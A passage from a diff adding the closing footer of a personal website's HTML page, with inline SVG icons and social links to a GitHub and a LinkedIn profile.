+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+    
+    <a href="https://github.com/sdvickers98" target="_blank" rel="noopener" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" aria-label="follow on GitHub——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+    
+    <a href="https://www.linkedin.com/in/dakota-vickers-90748a190/" target="_blank" rel="noopener" class="linkedin ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" aria-label="follow on LinkedIn——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 65 65;" version="1.1" viewBox="0 0 65 65"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <path d="M50.837,48.137V36.425c0-6.275-3.35-9.195-7.816-9.195  c-3.604,0-5.219,1.983-6.119,3.374V27.71h-6.79c0.09,1.917,0,20.427,0,20.427h6.79V36.729c0-0.609,0.044-1.219,0.224-1.655  c0.49-1.22,1.607-2.483,3.482-2.483c2.458,0,3.44,1.873,3.44,4.618v10.929H50.837z M22.959,24.922c2.367,0,3.842-1.57,3.842-3.531  c-0.044-2.003-1.475-3.528-3.797-3.528s-3.841,1.524-3.841,3.528c0,1.961,1.474,3.531,3.753,3.531H22.959z M34,64  C17.432,64,4,50.568,4,34C4,17.431,17.432,4,34,4s30,13.431,30,30C64,50.568,50.568,64,34,64z M26.354,48.137V27.71h-6.789v20.427  H26.354z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
